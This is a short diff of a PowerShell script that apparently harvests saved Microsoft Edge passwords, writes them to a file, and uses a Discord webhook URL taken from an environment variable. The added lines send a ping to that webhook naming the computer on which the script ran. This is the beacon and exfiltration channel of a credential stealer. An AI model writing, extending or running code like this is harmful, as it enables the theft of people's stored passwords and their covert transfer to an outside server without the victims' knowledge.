@@ -267,7 +267,10 @@ $edgeResults | ForEach-Object {
 Write-Host "Passwords saved to: $outputFile"
 
 # Get webhook URL from environment variable
-$webhookUrl = $env:DISCORD_WEBHOOK_URL
+$WebhookUrl = $env:DISCORD_WEBHOOK_URL
+
+# Optional: Send immediate ping to confirm execution
+Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body (@{ content = "✅ New script triggered on $env:COMPUTERNAME" } | ConvertTo-Json) -ContentType 'application/json'
 
 if ([string]::IsNullOrEmpty($webhookUrl)) {
     Write-Error "No webhook URL set. Exiting."
